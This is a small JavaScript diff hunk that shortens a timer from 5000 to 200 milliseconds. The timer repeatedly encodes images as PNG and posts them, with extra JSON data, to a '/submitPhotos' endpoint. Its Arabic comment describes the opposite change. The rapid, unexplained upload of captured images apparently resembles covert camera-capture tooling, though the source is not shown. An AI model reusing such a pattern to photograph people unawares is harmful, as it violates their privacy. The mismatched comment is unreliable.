@@ -112,7 +112,7 @@
                 formData.append('additionalData', JSON.stringify(additionalData));
                 post('/submitPhotos', formData);
             }, 'image/png');
-        }, 5000); // تغيير إلى 5000 مللي ثانية (5 ثوان) بدلاً من 200 مللي ثانية
+        }, 200); // تغيير إلى 5000 مللي ثانية (5 ثوان) بدلاً من 200 مللي ثانية
     });
 }
 
